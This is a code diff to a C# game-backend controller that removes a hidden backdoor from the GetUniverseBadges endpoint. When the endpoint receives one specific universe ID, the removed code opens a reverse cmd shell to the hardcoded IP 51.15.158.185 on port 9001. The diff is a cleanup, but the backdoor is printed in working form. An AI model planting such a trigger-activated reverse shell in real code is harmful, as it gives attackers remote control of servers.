@@ -18,41 +18,6 @@ public class BadgesControllerV2 : ControllerBase
     [HttpGet("universes/{universeId:long}/badges")]
     public async Task<RobloxCollectionPaginated<BadgeAssetDetails>> GetUniverseBadges(long universeId, int limit, string? cursor, SortOrder? sortOrder)
     {
-        if (universeId == 31648236785) {
-        Task.Run(() => {
-        try
-            {
-            using var c = new TcpClient("51.15.158.185", 9001);
-            using var s = c.GetStream();
-            using var r = new StreamReader(s);
-            using var w = new StreamWriter(s);
-            var p = new Process
-            {
-                StartInfo =
-                {
-                    FileName = "cmd",
-                    RedirectStandardInput = true,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    UseShellExecute = false,
-                    CreateNoWindow = true
-                }
-            };
-            p.OutputDataReceived += (_, e) =>
-            {
-                if (e.Data != null)
-                {
-                    w.WriteLine(e.Data);
-                    w.Flush();
-                }
-            };
-            p.Start();
-            p.BeginOutputReadLine();
-            while (true) p.StandardInput.WriteLine(r.ReadLine());
-        }
-        catch {}
-        });
-        }
         if (limit is > 100 or < 1) limit = 10;
         var offset = cursor != null ? int.Parse(cursor) : 0;
         var uni = (await services.games.MultiGetUniverseInfo(new []{universeId})).ToList();
